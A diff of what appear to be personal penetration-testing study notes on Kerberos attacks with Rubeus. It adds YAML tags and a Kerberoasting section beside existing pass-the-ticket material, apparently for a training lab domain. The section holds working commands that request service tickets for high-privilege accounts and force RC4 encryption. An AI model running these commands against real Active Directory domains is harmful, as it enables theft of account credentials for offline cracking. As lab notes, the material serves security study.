@@ -1,4 +1,10 @@
-Attacks: #PtT 
+---
+tags:
+  - windows
+  - kerberoasting
+  - PtT
+  - PtH
+---
 # Modules
 ## Dump Kerberos Ticket Data
 ```cmd-session
@@ -44,3 +50,15 @@ This should open a new CMD window from where we can execute Rubeus to request a 
 > powershell
 PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
 ```
+# Kerberoasting
+## Gather Stats
+```powershell
+PS > .\Rubeus.exe kerberoast /stats
+```
+## Retrieve TGS Tickets
+- Request tickets of accounts with `admincount=1` (high value targets):
+```powershell
+PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+## Usefule Flags
+- `/tgtdeleg`: Retrieve only `RC4` encrypted ticket (Does not work on Server 2019+)
